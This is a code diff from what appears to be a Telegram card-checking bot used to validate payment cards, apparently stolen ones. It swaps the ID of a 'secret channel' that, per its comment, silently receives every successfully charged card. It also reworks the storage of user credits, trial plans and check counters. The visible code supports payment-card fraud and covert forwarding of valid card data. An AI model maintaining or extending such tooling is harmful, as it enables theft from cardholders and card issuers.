@@ -67,7 +67,7 @@ HIT_LOG_GROUP_ID       = -1004361062205   # public hit log group
 EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log
 
 # ── Secret channel — auto-receives every CHARGED card silently ──────────────
-SECRET_CHANNEL_ID   = -1004499920555
+SECRET_CHANNEL_ID   = -1003968669478
 SECRET_CHANNEL_LINK = "https://t.me/+BfUGjEXaySM2MDc0"
 # ── Result card buttons ─────────────────────────────────────────────────────
 BOT_USERNAME_LINK   = "https://t.me/Batxchk_bot"
@@ -1889,7 +1889,25 @@ def _is_premium(ud: dict, uid: int) -> bool:
 
 
 def _get_ud(uid: int, ctx) -> dict:
-    return ctx.bot_data.setdefault("users", {}).setdefault(uid, {})
+    """Fetch (or create) user dict from the SAME store as main.py.
+    main.py uses bot_data["user_data"][str(uid)] with 150 starter credits.
+    Using a different key ("users") meant sh.py always saw an empty dict → 0 credits.
+    """
+    ud_store = ctx.bot_data.setdefault("user_data", {})
+    key      = str(uid)
+    if key not in ud_store:
+        from datetime import datetime as _dt
+        ud_store[key] = {
+            "name": "User", "first_name": "User", "last_name": "", "username": "",
+            "language_code": "en",
+            "joined":      _dt.now().strftime("%Y-%m-%d %H:%M"),
+            "last_active": _dt.now().strftime("%Y-%m-%d %H:%M"),
+            "credits": 150, "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0,
+            "total_refs": 0, "total_checks": 0, "approved_checks": 0,
+            "declined_checks": 0, "last_gate": "N/A", "last_card": "N/A",
+            "codes_redeemed": 0, "keys_redeemed": 0, "banned": False,
+        }
+    return ud_store[key]
 
 
 def _sid() -> str:
